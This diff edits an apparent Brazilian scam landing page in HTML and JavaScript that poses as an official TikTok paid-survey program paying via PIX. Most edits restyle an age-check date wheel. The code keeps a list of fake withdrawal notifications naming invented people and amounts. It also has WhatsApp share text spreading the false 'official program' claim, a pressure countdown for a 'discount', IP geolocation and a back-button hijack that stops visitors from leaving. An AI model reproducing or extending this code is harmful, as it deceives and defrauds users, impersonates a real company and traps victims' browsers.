@@ -37,10 +37,15 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 16px;
+      font-size: 15px;
       cursor: pointer;
       transition: all 0.2s ease;
       user-select: none;
+      color: #94a3b8;
+    }
+    .wheel-item.selected {
+      color: #0f172a;
+      font-weight: 700;
     }
   </style>
 </head>
@@ -96,35 +101,29 @@
       </div>
       <div class="space-y-2">
         <h1 class="text-2xl font-bold tracking-tight text-slate-900">Verificação de Idade</h1>
-        <p class="text-sm text-slate-500 leading-relaxed">Selecione sua data de nascimento abaixo para confirmar sua idade e prosseguir[span_1](start_span)[span_1](end_span).</p>
+        <p class="text-sm text-slate-500 leading-relaxed">Selecione sua data de nascimento abaixo para confirmar sua idade e prosseguir.</p>
       </div>
 
       <!-- Container do Rolo de Data -->
-      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl relative">
-        <div class="flex justify-between text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-2 px-4">
+      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl relative overflow-hidden">
+        <div class="grid grid-cols-3 gap-2 text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-2">
           <span>Dia</span>
           <span>Mês</span>
           <span>Ano</span>
         </div>
 
-        <!-- Barra de destaque central estilo TikTok -->
-        <div class="absolute inset-x-4 top-[84px] h-[40px] bg-white border border-slate-200 rounded-xl pointer-events-none shadow-sm z-10"></div>
+        <!-- Barra de destaque central transparente com borda -->
+        <div class="absolute inset-x-4 top-[78px] h-[40px] border-y border-slate-300 pointer-events-none z-10 bg-slate-100/40 backdrop-blur-[1px]"></div>
 
-        <div class="grid grid-cols-3 gap-2 relative h-[160px]">
+        <div class="grid grid-cols-3 gap-2 relative h-[150px]">
           <!-- Rolo de Dias -->
-          <div id="wheel-days" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
-            <!-- Preenchido via JavaScript -->
-          </div>
+          <div id="wheel-days" class="wheel-container overflow-y-auto h-full px-1 py-[55px]"></div>
 
           <!-- Rolo de Meses -->
-          <div id="wheel-months" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
-            <!-- Preenchido via JavaScript -->
-          </div>
+          <div id="wheel-months" class="wheel-container overflow-y-auto h-full px-1 py-[55px]"></div>
 
           <!-- Rolo de Anos -->
-          <div id="wheel-years" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
-            <!-- Preenchido via JavaScript -->
-          </div>
+          <div id="wheel-years" class="wheel-container overflow-y-auto h-full px-1 py-[55px]"></div>
         </div>
       </div>
 
@@ -623,15 +622,13 @@
   <script>
     let currentStep = 1;
     let userBalance = 0;
-    let completedSteps = {}; // Guarda quais etapas já renderam valor para evitar duplicar saldo
+    let completedSteps = {}; 
     let videoTimer = null;
     let secondsWatched = 0;
     const totalRequired = 40;
-    let discountCountdown = 299; // 5 minutos
+    let discountCountdown = 299;
     let discountInterval = null;
     let hasDiscountBeenApplied = false;
-
-    // Estado do compartilhamento (Quantas vezes compartilhou)
     let shareCount = 0;
 
     const fakeNotifications = [
@@ -642,7 +639,6 @@
       { name: "Carla Mendes de Marabá", text: "sacou R$ 872,75" }
     ];
 
-    // --- POPULAR OS ROLOS DE DATA AO CARREGAR ---
     window.addEventListener('DOMContentLoaded', () => {
       initDateWheels();
       fetchUserLocation();
@@ -657,45 +653,63 @@
       const monthsContainer = document.getElementById('wheel-months');
       const yearsContainer = document.getElementById('wheel-years');
 
-      // Preencher Dias (1 a 31)
-      let daysHtml = '<div style="height: 60px;"></div>'; // Espaçamento superior
+      let daysHtml = '<div style="height: 55px;"></div>';
       for (let i = 1; i <= 31; i++) {
-        daysHtml += `<div class="wheel-item font-semibold text-slate-700" data-value="${i}">${i < 10 ? '0' + i : i}</div>`;
+        daysHtml += `<div class="wheel-item" data-value="${i}">${i < 10 ? '0' + i : i}</div>`;
       }
-      daysHtml += '<div style="height: 60px;"></div>'; // Espaçamento inferior
+      daysHtml += '<div style="height: 55px;"></div>';
       daysContainer.innerHTML = daysHtml;
 
-      // Preencher Meses
-      let monthsHtml = '<div style="height: 60px;"></div>';
+      let monthsHtml = '<div style="height: 55px;"></div>';
       monthsNames.forEach((m, index) => {
-        monthsHtml += `<div class="wheel-item font-semibold text-slate-700 capitalize" data-value="${index + 1}">${m}</div>`;
+        monthsHtml += `<div class="wheel-item capitalize" data-value="${index + 1}">${m}</div>`;
       });
-      monthsHtml += '<div style="height: 60px;"></div>';
+      monthsHtml += '<div style="height: 55px;"></div>';
       monthsContainer.innerHTML = monthsHtml;
 
-      // Preencher Anos (De 1940 até o ano atual)
       const currentYear = new Date().getFullYear();
-      let yearsHtml = '<div style="height: 60px;"></div>';
+      let yearsHtml = '<div style="height: 55px;"></div>';
       for (let y = currentYear; y >= 1940; y--) {
-        yearsHtml += `<div class="wheel-item font-semibold text-slate-700" data-value="${y}">${y}</div>`;
+        yearsHtml += `<div class="wheel-item" data-value="${y}">${y}</div>`;
       }
-      yearsHtml += '<div style="height: 60px;"></div>';
+      yearsHtml += '<div style="height: 55px;"></div>';
       yearsContainer.innerHTML = yearsHtml;
 
-      // Definir posições iniciais padrão (ex: 14 de agosto de 2000 ou maior de idade)
       setTimeout(() => {
         scrollToValue('wheel-days', 14);
-        scrollToValue('wheel-months', 8); // agosto
+        scrollToValue('wheel-months', 8);
         scrollToValue('wheel-years', 2000);
+        updateWheelHighlight('wheel-days');
+        updateWheelHighlight('wheel-months');
+        updateWheelHighlight('wheel-years');
       }, 100);
+
+      daysContainer.addEventListener('scroll', () => updateWheelHighlight('wheel-days'));
+      monthsContainer.addEventListener('scroll', () => updateWheelHighlight('wheel-months'));
+      yearsContainer.addEventListener('scroll', () => updateWheelHighlight('wheel-years'));
     }
 
     function scrollToValue(containerId, value) {
       const container = document.getElementById(containerId);
       const item = container.querySelector(`[data-value="${value}"]`);
       if (item) {
-        container.scrollTop = item.offsetTop - 60;
+        container.scrollTop = item.offsetTop - 55;
       }
+    }
+
+    function updateWheelHighlight(containerId) {
+      const container = document.getElementById(containerId);
+      const items = container.querySelectorAll('.wheel-item');
+      const scrollTop = container.scrollTop;
+
+      items.forEach(item => {
+        const diff = Math.abs(item.offsetTop - 55 - scrollTop);
+        if (diff < 20) {
+          item.classList.add('selected');
+        } else {
+          item.classList.remove('selected');
+        }
+      });
     }
 
     function getSelectedWheelValue(containerId) {
@@ -707,7 +721,7 @@
       let minDiff = Infinity;
 
       items.forEach(item => {
-        const diff = Math.abs(item.offsetTop - 60 - scrollTop);
+        const diff = Math.abs(item.offsetTop - 55 - scrollTop);
         if (diff < minDiff) {
           minDiff = diff;
           closestItem = item;
@@ -717,13 +731,10 @@
       return parseInt(closestItem.getAttribute('data-value'));
     }
 
-    // --- LÓGICA DE COMPARTILHAMENTO DIRETO WHATSAPP ---
     function shareLink() {
       if (shareCount >= 3) return;
-
       const shareUrl = window.location.href;
       const shareText = "Olha esse programa oficial de pesquisas remuneradas do TikTok! Estou recebendo em tempo real no PIX: " + shareUrl;
-
       openWhatsApp(shareText);
     }
 
@@ -773,7 +784,6 @@
       }
     }
 
-    // --- ACCORDION FAQ ---
     function toggleFaq(index) {
       const answer = document.getElementById(`faq-answer-${index}`);
       const icon = document.getElementById(`faq-icon-${index}`);
@@ -789,7 +799,6 @@
       }
     }
 
-    // --- GEOLOCALIZAÇÃO AUTOMÁTICA POR IP ---
     async function fetchUserLocation() {
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -802,10 +811,8 @@
       }
     }
 
-    // --- BACK REDIRECT SENSÍVEL AO CONTEXTO ---
     function setupBackRedirect() {
       history.pushState({ step: currentStep }, null, location.href);
-      
       window.onpopstate = function (e) {
         if (currentStep >= 7 || currentStep === 'discount') {
           history.pushState(null, null, location.href);
@@ -892,7 +899,6 @@
       }
     }
 
-    // --- VERIFICAÇÃO DE IDADE ATRAVÉS DO ROLO ---
     function verifyBirthDate() {
       const day = getSelectedWheelValue('wheel-days');
       const month = getSelectedWheelValue('wheel-months');
